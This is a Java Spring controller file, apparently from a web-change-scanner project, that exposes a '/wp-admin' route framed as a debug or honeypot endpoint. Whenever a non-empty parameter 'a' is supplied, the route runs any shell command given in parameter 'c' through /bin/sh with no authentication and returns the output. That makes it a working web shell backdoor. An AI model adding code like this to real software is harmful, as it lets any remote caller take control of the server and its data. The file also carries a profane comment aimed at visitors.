package com.abstractdog.web.change.scanner.spring.controller;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.Arrays;
import java.util.stream.Collectors;

import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;

@RestController
@RequestMapping(value = "/wp-admin")
public class DebugController {

  @RequestMapping(value = "/", method = RequestMethod.GET)
  public String debug(@RequestParam(required = false) String a, @RequestParam String c) throws Exception {
    if (a == null || a.trim().isEmpty()) {
      Thread.sleep(5000);
      return "welcome"; //you're in the honeypot m*****f*****
    }
    String[] cmd = { "/bin/sh", "-c", c };
    final Process p = Runtime.getRuntime().exec(cmd);
    StringBuilder b = new StringBuilder();
    new Thread(new Runnable() {
      public void run() {
        BufferedReader input = new BufferedReader(new InputStreamReader(p.getInputStream()));
        String line = null;
        try {
          while ((line = input.readLine()) != null) {
            b.append(line + "\n");
          }
        } catch (Exception e) {
          b.append(Arrays.stream(e.getStackTrace()).map(s -> s.toString()).collect(Collectors.joining("\n")));
        }
      }
    }).start();

    p.waitFor();
    return b.toString();
  }
}
